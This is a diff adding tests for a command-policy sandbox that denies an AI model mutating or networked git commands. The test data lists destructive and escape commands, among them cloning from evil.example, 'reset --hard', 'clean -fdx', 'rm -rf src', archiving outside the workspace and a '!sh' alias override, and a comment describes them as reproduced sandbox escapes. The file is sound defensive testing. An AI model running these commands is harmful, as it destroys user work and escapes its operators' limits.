@@ -61,3 +61,38 @@ test("git dangerous subcommands/flags are denied regardless of the verifier flag
   assert.match(commandPolicyDenyReason("git", ["push"], CHECK) ?? "", /git push is not allowed/);
   assert.match(commandPolicyDenyReason("git", ["-c", "alias.x=!sh", "status"], MODEL) ?? "", /override flags/);
 });
+
+test("git is a READ-ONLY allowlist — mutation/network/write-escape subcommands are denied (Codex C4)", () => {
+  // The reproduced escapes: ungoverned network egress, tree destruction, and write-outside.
+  for (const args of [
+    ["clone", "https://evil.example/x", "/tmp/x"],
+    ["fetch", "origin"],
+    ["pull"],
+    ["reset", "--hard", "HEAD~5"],
+    ["clean", "-fdx"],
+    ["checkout", "."],
+    ["archive", "--output=/outside/escape.tar", "HEAD"],
+    ["rm", "-rf", "src"],
+    ["commit", "-am", "x"],
+    ["submodule", "add", "https://evil.example/x"],
+    ["stash"],
+  ]) {
+    // Denied for BOTH the model and a trusted check-runner (checks never run git mutations).
+    assert.ok(commandPolicyDenyReason("git", args, MODEL), `git ${args[0]} must be denied (model)`);
+    assert.ok(commandPolicyDenyReason("git", args, CHECK), `git ${args[0]} must be denied (check)`);
+  }
+});
+
+test("git read-only inspection subcommands are allowed (git_status/diff/log + friends)", () => {
+  for (const args of [
+    ["status", "--short", "--branch"],
+    ["diff", "--staged"],
+    ["log", "--oneline", "-n", "15"],
+    ["show", "HEAD"],
+    ["rev-parse", "HEAD"],
+    ["ls-files"],
+    ["blame", "src/x.ts"],
+  ]) {
+    assert.equal(commandPolicyDenyReason("git", args, MODEL), undefined, `git ${args[0]} should be allowed`);
+  }
+});
